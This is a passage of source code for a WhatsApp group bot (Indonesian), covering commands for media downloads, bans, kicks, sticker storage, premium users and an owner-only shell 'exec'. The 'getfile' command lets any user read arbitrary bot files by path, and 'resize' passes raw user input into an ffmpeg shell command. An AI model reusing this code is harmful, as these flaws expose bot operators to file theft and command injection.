let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let Url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(Url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
setReply(`*Mohon tunggu, sedang mengirim repository..*`)
await conn.sendMedia (from, Url, m, {fileName: filename})
} catch (err){
setReply(mess.error.link)
}
break 
  
case 'getfile':{
if(!q) return setReply("Mau cari file apa")
let format = q.split(".")[1]
if(!format) return setReply('Tipe file js atau json?')
let mimetype = format == "js"?  'text/javascript' : format == "json"? 'application/json' : ""
let jpegThumbnail = fs.readFileSync("./stik/thumbnaildokumen.jpg")
setReply("Getting File...")
await sleep(2000)

let data1 = await fs.existsSync(`./database/${q}`)
let data2 = await fs.existsSync(`./message/${q}`)
let data3 = await fs.existsSync(`./lib/${q}`)
let data4 = await fs.existsSync(`./${q}`)
let data5 = await fs.existsSync(`./stik/${q}`)
  
if(data1) {	
let file = fs.readFileSync(`./database/${q}`)
conn.sendMessage(m.chat, { document: file, fileName: q, mimetype,  jpegThumbnail  }, { quoted: m })
} else if(data2) {	
let file = fs.readFileSync(`./message/${q}`)
conn.sendMessage(m.chat, { document: file, fileName: q, mimetype,  jpegThumbnail  }, { quoted: m })
} else if(data3) {
let file = fs.readFileSync(`./lib/${q}`)
conn.sendMessage(m.chat, { document: file, fileName: q, mimetype,  jpegThumbnail }, { quoted: m })
} else if(data4) {
let file = fs.readFileSync(`./${q}`)
conn.sendMessage(m.chat, { document: file, fileName: q, mimetype,  jpegThumbnail }, { quoted: m })
} else if(data5) {	
let file = fs.readFileSync(`./stik/${q}`)
  
if(format == "mp4"){
conn.sendMessage(m.chat, { video: file},{ quoted: m }) 
} else conn.sendMessage(m.chat, {image: file},{ quoted: m })
  
} else setReply("File not found")

}
break
    
case 'ambilcase':
try{
if (!m.key.fromMe && !isOwner) return setReply(mess.only.owner)
if (!q) return setReply("*Mau nyari Case apa kak*") 
if(q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix")
let nana = await getCase(q)
setReply(nana)
} catch(err){
console.log(err)
setReply(`Case ${q} tidak di temukan`)
}
break 


case 'ban':
case    'banned':{
let alasan = ""
if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "")
let Name = await conn.getName(woke)
if(_ban.check(woke, ban)) return setReply("User sudah di ban sebelumnya")
_ban.add(Name,calender,woke,alasan, ban)
setReply( `Berhasil banned ${woke}`);
} else if(users){
let alasan = mentionByReply? q : mentionByTag? q.split("|")[1] : ""
if(alasan == undefined) alasan = "Tidak ada"
let Nomer = `${users.split("@")[0]}`
if(_ban.check(Nomer, ban)) return setReply("User sudah di ban sebelumnya")
let Name = await conn.getName(users)
if(ownerNumber.includes(users)) return setReply("Tidak bisa membanned owner")
_ban.add(Name,calender,Nomer,alasan, ban)
setReply( `Berhasil banned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break

case 'unban':
case   'delban':
case   'unbanned':{
if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner') 
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
if(!_ban.check(woke, ban)) return setReply("User sudah di unban sebelumnya")
_ban.del(woke, ban)             
setReply( `Berhasil unbanned ${woke}`);
} else if(users){
let Nomer =`${users.split("@")[0]}`
if(!_ban.check(Nomer, ban)) return setReply("User sudah di unban sebelumnya")
_ban.del(Nomer, ban)             
setReply(`Berhasil unbanned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break

case 'listban':{
let banya = `*List Banned*\nJumlah : ${ban.length}\n\n`
ban.map(function(e, i){
banya +=(i+1)+`. Nomer : wa.me/${e.id}\n└▸ Tanggal : ${e.date}\n└▸ Alasan : ${e.reason} \n\n`            
});
setReply(banya)
}
break

case 'kick': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await conn.groupParticipantsUpdate(from, [Input], 'remove').then((res) => setReply(`Berhasil mengeluarkan  ${Input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err)))
}
break

case 'add': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await conn.groupParticipantsUpdate(from, [Input], 'add').then((res) =>{
if(res[0].status == 200) setReply(`Berhasil menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
if(res[0].status == 403) setReply(`Gagal menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
}).catch((err) => setReply(jsonformat(err)))
}
break

case 'demote': 
case    'unadmin':{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await conn.groupParticipantsUpdate(from, [users], 'demote').then((res) => setReply(`Sukses Demote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break

case 'promote':
case     'admin': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await conn.groupParticipantsUpdate(from, [users], 'promote').then((res) => setReply(`Sukses Promote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break

case 'opentime':
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
conn.groupSettingUpdate(from, 'not_announcement')
setReply(open)
}, timer)
break

//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
    
case 'closetime':
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
conn.groupSettingUpdate(from, 'announcement')
setReply(close)
}, timer)
break

case 'tr': {
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let err = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {to: lang})
} catch (e) {
result = await translate(`${text}`, {to: defaultLang,})
setReply(err)
} finally {
setReply(result[0])
}
}
break

case 'listblock':{
let block = await conn.fetchBlocklist()            
setReply('List Block:\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`)
}
break

case 'revoke':
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await conn.groupRevokeInvite(from).then( res => {
setReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break

case 'hidetag':
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins && !isOwner) return m.reply(mess.only.admin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break


case 'ytmp4':
try{
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")

if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}

let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Video tidak di temukan")
let info = await ytdl.getInfo(link);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
📄 Size : ${FileSize(format.contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
🌎 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await conn.sendMessage(from, {image: {url: anu.all[0].image}, caption: teks},{quoted: m})
downloadMp4(q)
} catch(err){
setReply(`${err}`)
}
break



case 'ytmp3':
{
if(!q) return setReply("Masukan link youtube")
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Musik tidak di temukan")
try{
var foto = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`
} catch (err){
var foto = anu.all[0].image
}

try{
let info = await ytdl.getInfo(link);
let format = ytdl.filterFormats(info.formats, 'audioonly');
if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE AUDIO DOWNLOADER*

📂 Title : ${info.videoDetails.title}
📄 Size : ${FileSize(format[0].contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
👤 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await conn.sendMessage(from, {image: {url: foto}, caption: teks},{quoted: m})
downloadMp3(q)
} catch(err){
setReply(err)
}
}
break



case 'addstik':{
const client = require('filestack-js').init(fileStackApi)
if(!isQuotedSticker) return setReply("Reply sticker")
if(!q) return setReply("Nama stickernya apa?")
if(db.data.sticker[q]) return setReply("Nama tersebut sudah ada di dalam database")
let media = await conn.downloadAndSaveMediaMessage(quoted, q)
await client.upload(media, {}, { filename: q }, {}).then(data => {
db.data.sticker[q] = {
name: data._file.name,
id: data.handle,
size: FileSize(data._file.size),
link: data.url
}
})
let teks = `Berhasil menambahkan sticker
ke dalam database dengan nama *${q}*`
await setReply(teks)
await fs.unlinkSync(media)
}
break 


case 'delstik':{
if(!m.key.fromMe & !isOwner) return setReply('Only owner')
if (!q) return setReply("Masukan query")
try {
if(!db.data.sticker[q]) return setReply("Nama tersebut tidak ada di dalam data base")
delete db.data.sticker[q]
setReply(`Succes delete sticker ${q}!`)
} catch (err) {
console.log(err)
setReply(`Gagal delete sticker ${q}!`)
}
}
break

case 'getallstik':
let stiker1 = Object.keys(db.data.sticker)
for (let jid of stiker1){
await conn.sendMessage(from, {sticker: {url: db.data.sticker[jid].link }})
await sleep(1000)
}
break


case 'addvn':{
const client = require('filestack-js').init(fileStackApi);
if(!isQuotedAudio) return setReply("Reply audio")
if(!q) return setReply("Nama audionya apa?")
if(db.data.audio[q]) return setReply("Nama tersebut sudah ada di dalam database")
let media = await conn.downloadAndSaveMediaMessage(quoted, q)
await client.upload(media, {}, { filename: q }, {}).then(data => {
db.data.audio[q] = {
name: data._file.name,
id: data.handle,
size: FileSize(data._file.size),
link: data.url
}
})
let teks = `Berhasil menambahkan audio
ke dalam database dengan nama *${q}*`
await setReply(teks)
await fs.unlinkSync(media)
}
break 

//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
case 'delvn':{
if (!isOwner) return onlyOwner()
try {
if(!db.data.audio[q]) return setReply("Nama tersebut tidak ada di dalam data base")
delete db.data.audio[q]
setReply(`Sukses delete vn ${q}`)
} catch (err){
console.log(err)
setReply('eror kak')
}
}
break

    case  'addkick':{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!Input) return setReply("reply/tag/nomer target")
let grup = db.data.kickon[from]
let number = Input.split("@")[0]
if(grup){
if(grup.includes(number)) return setReply("Target sudah ada di database")
grup.push(number)
setReply(`Berhasil memasukan ${number} ke dalam target kick`)
} else {
//db.data.kickon[from] = []
grup.push(number)
let teks =`Berhasil memasukan ${number} ke dalam target kick
dan telah menandai user sebagai user biadap`
setReply(teks)
}
}
break
case 'delkick':{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
let grup = db.data.kickon[from]
if(!grup) return setReply("Gunakan fitur addkick terlebih dahulu")
let number = Input.split("@")[0]
grup.splice(grup.indexOf(number,1))
setReply("Berhasil menghapus user dari target kick")
}
break

case 'listkick':{
let kick = db.data.kickon[from]
if(!kick) return setReply("Group ini tidak memiliki listkick")
let banya = `*List Kick*\nJumlah : ${kick.length}\n\n`
kick.map(function(e, i){
banya +=(i+1)+`. Nomer : wa.me/${e}\n\n`            
});
setReply(banya)
}
break    

case 'resize':
if (isQuotedImage || isImage) {
if(!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
setReply(mess.wait)
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await conn.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply("Reply Imagenya")
}
break    
    

case 'setnamebot':
if (!isOwner) return onlyOwner()
setReply(`Berhasil mengubah nama bot ke ${q}`)
fake = `${q}`
break 


case 'update': {
const lala = JSON.parse(fs.readFileSync('./package.json'))
let listSerch = []
let listmodule = Object.keys(lala.dependencies)
let nono = Object.entries(lala.dependencies)
let teskd = `\nResult From *Package.json*\n\n*Select any module*`
for (let i of nono) {
listSerch.push({
title: i[0],
rowId: `${prefix}listversion npm view ${i[0]} versions --json`,
description: `${i[1]}`
})
}
const sections = [
{
title: "Total Module " + listmodule.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*Update Dependencies*`,
buttonText: "FOUND",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})
}
break 



case 'exec':{
if (!itsMe && !isOwner) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
await setReply(`${stdout}`)
let teks = `Berhasil menginstall module ${q.replace("npm i","")}`
let mok = [{"buttonId": `${prefix}restart`,"buttonText": {"displayText": `Restart`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${copyright}`,
buttons: mok,
headerType: 1
}
await conn.sendMessage(from, tolol , {quoted: m})
}
})
}
break
    
case 'uninstall': {
if (!itsMe && !isOwner) return onlyOwner()
const lala = JSON.parse(fs.readFileSync('./package.json'))

let listSerch = []
let listmodule = Object.keys(lala.dependencies)
let nono = Object.entries(lala.dependencies)
let teskd = `\nResult From *Package*\n\n*Select any module*`
for (let i of nono) {
listSerch.push({
title: i[0],
rowId: `${prefix}$ npm uninstall ${i[0]}`,
description: `${i[1]}`
})
}
const sections = [
{
title: "Total Module " + listmodule.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*Uninstall Dependencies*`,
buttonText: "FOUND",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})
}
break


case 'blockcmd':
if (!isOwner) return onlyOwner()
if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (_blockcmd.check(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
_blockcmd.add(q,listcmdblock)         
setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
break

case 'unblockcmd':
try{
if (!isOwner) return onlyOwner()
if(!q) return setReply("Textnya mana cih")
if (!_blockcmd.check(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
_blockcmd.del(q, listcmdblock)        
setReply(`Berhasil unblock command 「 *${q}* 」`)
} catch (err) {
setReply("Bjirr error, keknya ada yang error")
}
break


case  'addowner':{
if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if(_data.checkDataId("owner", Input,  DataId)) return setReply("User sudah menjadi owner")
if(!_data.checkDataName("owner", Input, DataId)) { await _data.createDataId("owner", DataId) }
_data.addDataId(Input, "owner", DataId)
setReply(`Berhasil menambahkan ${Input} ke daftar owner`)
}
break
    
case 'delowner':
if (!isOwner) return onlyOwner()
try {
if(!_data.checkDataId("owner", Input, DataId)) return setReply(`User bukan owner`)
_data.removeDataId ("owner", Input, DataId)
setReply(`Berhasil menghapus ${Input.split("@")[0]} ke daftar owner`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break


case 'liststik':{
let teks = '*Sticker list :*\n\n'
for (let awokwkwk of Object.keys(db.data.sticker)) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${Object.keys(db.data.sticker).length}*`
setReply(teks)
}
break



case 'listvn':
{
let teks = '*List Vn:*\n\n'
for (let awokwkwk of Object.keys(db.data.audio)) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total ada : ${Object.keys(db.data.audio).length}*`
teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
setReply(teks)
}
break

case 'addprem':{
if (!isOwner) return onlyOwner()
if(isGroup && users){
if(!q) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)
if(mentionByReply){
var waktunya = q	
 } else if(mentionByTag) {
var waktunya = q.split(" ")[1] || q.split("|")[1]
if(waktunya == undefined) return setReply("masukan waktu\ns = detik\nh = jam\nd =hari")
 }
 _prem.addPremiumUser(users, waktunya, premium)
let teks =`
Success
📛 *Number:* ${users.split("@")[0]}
📆 *Days:* ${conn.msToDate(toMs(waktunya))}
📉 *Countdown:* ${toMs(waktunya)}`

setReply(teks)

	
} else if(!isGroup){
let usernya = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
let waktunye = q.split("|")[1]
let teks =`
Success
📛 *Number:* ${usernya.split("@")[0]}
📆 *Days:* ${conn.msToDate(toMs(waktunye))}
📉 *Countdown:* ${toMs(waktunye)}`
_prem.addPremiumUser (usernya, waktunye, premium)
await setReply(teks)

} else setReply("Tag atau Reply usernya")
}
break
/*
case 'addprem':{
if (!isOwner) return onlyOwner()
if(isGroup && users){
if(!q) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)
if(mentionByReply){
var waktunya = q	
 } else if(mentionByTag) {
var waktunya = q.split(" ")[1] || q.split("|")[1]
if(waktunya == undefined) return setReply("masukan waktu\ns = detik\nh = jam\nd =hari")
 }
 _prem.addPremiumUser(users, waktunya, premium)
let teks =`
Success
📛 *Number:* ${users.split("@")[0]}
📆 *Days:* ${conn.msToDate(toMs(waktunya))}
📉 *Countdown:* ${toMs(waktunya)}`

setReply(teks)

	
} else if(!isGroup){
let usernya = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
let waktunye = q.split("|")[1]
let teks =`
Success
📛 *Number:* ${usernya.split("@")[0]}
📆 *Days:* ${conn.msToDate(toMs(waktunye))}
📉 *Countdown:* ${toMs(waktunye)}`
_prem.addPremiumUser (usernya, waktunye, premium)
await setReply(teks)

} else setReply("Tag atau Reply usernya")
}
break
*/

case 'delprem':
if (!isOwner) return onlyOwner()
if(Input){
if(!_prem.checkPremiumUser (Input, premium)) return setReply("Maap kak user tersebut tidak ada di database") 
_prem.delPremiumUser (Input, premium)
setReply(`Succes delete premium ${Input.split("@")[0]}`)          
} else setReply("Tag/Reply/Input nomer target")
break    
    
case 'listprem':{
let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
let men = [];
for (let i of premium){
Log(i.id)
men.push(i.id)
let cekvip = ms(i.expired - Date.now())
txt += `*ID :* ${i.id.split("@")[0]}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
}
setReply(txt, men)
}
break


    
case 'setreply':{
if(!isOwner) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(replyType === "web") return setReply("Udah aktif")
replyType = "web"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'mess'){
if(replyType === "mess") return setReply("Udah aktif")
replyType = "mess"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(replyType === "troli") return setReply("Udah aktif")
replyType = "troli"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'quoted' ){
if(replyType === 'quoted') return setReply("Udah aktif")
replyType = "quoted"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
conn.sendButMessage(from, `SETTING REPLY\n1. web\n2. troli\n3. mess\n4. vidio\n5. quoted\n`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ϙᴜᴏᴛᴇᴅ`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
} else {
replyType = q
setReply("Set Reply Tidak Di Temukan")
}
}
break

case   'listcmdblock':    
case 'listblockcmd':{
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
setReply(wo)
}
break


case 'setmenu':
if(!isOwner) return onlyOwner()
if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
setmenu = "katalog"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else  if ((args[0]) === 'lokasi2'|| (args[0]) === 'prolocation2' ){
setmenu = "location2"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image'|| (args[0]) === 'img' ){
setmenu = "image"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'lokasi' ){
setmenu = "location"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image2'|| (args[0]) === 'img2' ){
setmenu = "image2"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}else if ((args[0]) === 'pptx'){
docType = "pptx"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'xlsx'){
docType = "xlsx"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'zip'){
docType = "zip"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'pdf'){
docType = "pdf"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'docx'){
docType = "docx"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'gif'){
setmenu = "gif"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
conn.sendButMessage(from, `SETTING MENU\n1.lokasi\n2.lokasi2\n3.img\n4.Pptx\n5.Xlsx\n6.Zip\n7.Pdf\n8.Docx\n9.gif`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
{buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}],setQuoted);
} else {
setReply("Menu tidak di temukan om")
}
break


case 'setimgreply':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/reply.jpg`)
fs.unlinkSync(delb)
